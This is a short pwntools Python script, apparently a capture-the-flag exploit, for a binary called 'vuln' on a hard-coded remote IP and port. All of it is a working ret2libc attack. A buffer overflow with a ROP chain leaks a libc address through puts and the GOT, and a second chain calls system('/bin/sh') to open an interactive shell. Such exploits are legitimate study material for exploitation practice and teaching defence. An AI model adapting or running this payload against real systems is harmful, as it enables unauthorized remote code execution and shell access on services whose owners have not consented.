
from pwn import *
context.log_level='debug'
context.arch='amd64'
#p=process('./vuln')
p=remote("35.188.73.186",1111)
repeater=0x000000000401146
rdi=0x0000000000401223
puts=0x000000000401030
got=0x000000000404018
#gdb.attach(p,'')
p.sendlineafter(" \n","A"*0x108+p64(rdi)+p64(got)+p64(puts)+p64(repeater))
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
p.readline()
base=u64(p.readline()[:-1].ljust(8,'\x00'))-libc.sym['puts']
libc.address=base
log.warning(hex(base))
ret=0x0000000004010C0
p.sendlineafter("back> \n","A"*0x108+p64(ret)+p64(rdi)+p64(libc.search("/bin/sh").next())+p64(libc.sym['system']))

p.interactive('n132>')
